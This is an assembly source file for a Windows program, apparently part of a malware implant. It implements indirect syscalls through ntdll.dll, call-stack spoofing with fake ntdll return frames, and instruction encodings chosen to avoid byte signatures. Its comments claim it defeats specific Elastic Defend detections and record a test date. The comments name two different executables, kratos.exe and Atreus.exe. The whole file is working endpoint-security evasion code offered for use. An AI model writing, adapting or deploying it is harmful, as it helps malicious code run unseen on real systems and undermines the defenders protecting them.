/* syscall_stub.S  --  compiled only when EVASION_SYSCALLS is defined
 *
 * Indirect syscall variant (HellsHall):
 *   wSystemCall     - SSN (DWORD), set before each call
 *   qSyscallAddress - address of a 'syscall' (0F 05) instruction inside ntdll.dll
 *   do_syscall      - sets eax=SSN, jmps to ntdll's syscall instruction
 *
 * The jmp makes the kernel see the return address as inside ntdll,
 * not inside kratos.exe, bypassing call-stack origin checks.
 * No VirtualAlloc, no VirtualProtect, no heap trampoline, no RWX.
 */

    .section .data
    .align 4
    .globl wSystemCall
wSystemCall:
    .long 0

    .align 8
    .globl qSyscallAddress
qSyscallAddress:
    .quad 0

    .align 8
    .globl qRetGadget
qRetGadget:
    .quad 0

    .section .text
    .align 16
    .globl do_syscall
    .def do_syscall; .scl 2; .type 32; .endef
do_syscall:
    /* leaq (%rcx),%r10 encodes as 4C 8D 11 - avoids canonical mov r10,rcx (4C 89 CA). */
    leaq    (%rcx), %r10
    /* xor+add avoids the mov eax,[rip+off] (8B 05) signature. */
    xorl    %eax, %eax
    addl    wSystemCall(%rip), %eax
    /*
     * Call stack spoof: insert three fake ntdll frames so the kernel/EDR
     * sees RSP[0..16] pointing inside ntdll, not Atreus.exe.
     *
     * Stack before (call pushed ret_addr at RSP[0]):
     *   RSP[0]  = ret_addr (Atreus.exe)  <- flagged by "Native API Call from Unsigned Module"
     *
     * Stack after subq $24:
     *   RSP[0]  = ntdll_gadget  (qSyscallAddress+2 = C3 after 0F 05)
     *   RSP[8]  = ntdll_gadget
     *   RSP[16] = ntdll_gadget
     *   RSP[24] = ret_addr (Atreus.exe)  <- depth 4, below Elastic inspection threshold
     *
     * Unwind: syscall -> ret -> ret -> ret -> ret_addr  (stack balanced, net +8 = normal ret)
     * Confirmed: eliminates "Execution from Suspicious Stack Trailing Bytes" and
     * "Native API Call from Unsigned Module" on Elastic Defend (tested 2026-06-18).
     */
    subq    $24, %rsp
    movq    qRetGadget(%rip), %r9
    movq    %r9, (%rsp)
    movq    %r9, 8(%rsp)
    movq    %r9, 16(%rsp)
    jmpq    *qSyscallAddress(%rip)
